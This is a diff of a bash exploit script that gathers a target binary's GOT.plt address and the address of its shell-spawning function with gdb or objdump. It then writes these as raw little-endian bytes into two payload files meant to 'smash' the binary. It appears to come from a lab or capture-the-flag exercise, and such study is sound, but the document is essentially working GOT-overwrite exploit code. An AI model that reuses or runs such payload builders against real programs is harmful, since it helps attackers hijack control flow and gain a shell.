@@ -1,9 +1,14 @@
 #!/bin/bash
 
-# Construct payloads
+# Construct payloads: collect the necessary addresses, and write the files needed to smash a particular binary
 
-usage="Usage: $0 <executable> <library-fn-name> <item-buffer-bound>"
+usage="Usage: $0 <path-to-executable>"
 grepnc="grep --color=never"
+
+if [[ "$#" -ne 1 ]]; then
+        echo $usage
+        exit 1
+fi
 
 binname=$1
 libfn="_IO_putc"
@@ -31,15 +36,8 @@ execloc=(`echo ${execloc[2]} | cut -f2 -d "x"`)
 echo "Location of $execfn@got.plt: 0x$execloc"
 
 # Find address of shell-spawning function
-spawnaddrline=(`gdb $binname -ex "p $spawnfn" -ex "quit" | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
-salindex=0
-for i in "${!spawnaddrline[@]}"; do
-	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
-		let salindex="$i-1"
-	fi
-done
-spawnaddr=(`echo ${spawnaddrline[$salindex]} | tr 'x' '0'`)
-echo "Address of spawn_shell(): $spawnaddr"
+spawnaddrline=(`objdump -x $binname | $grepnc $spawnfn`)
+echo "Address of $spawnfn: 0x$spawnaddrline"
 
 # Write first payload file
 if [ -f $dat1 ]; then rm $dat1; fi
@@ -48,8 +46,7 @@ for ((i=7;i>=0;i--)); do echo -n -e \\x${libaddrline:2*i:2} >> $dat1; done
 
 # Write second payload file
 if [ -f $dat2 ]; then rm $dat2; fi
-for ((i=3;i>=0;i--)); do echo -n -e \\x${spawnaddr:2*i:2} >> $dat2; done
-for i in {0..3}; do echo -n -e \\x00 >> $dat2; done
+for ((i=7;i>=0;i--)); do echo -n -e \\x${spawnaddrline:2*i:2} >> $dat2; done
 for i in $(seq 1 "$distance"); do
 	for ((i=7;i>=0;i--)); do echo -n -e \\x${execloc:2*i:2} >> $dat2; done
 done;
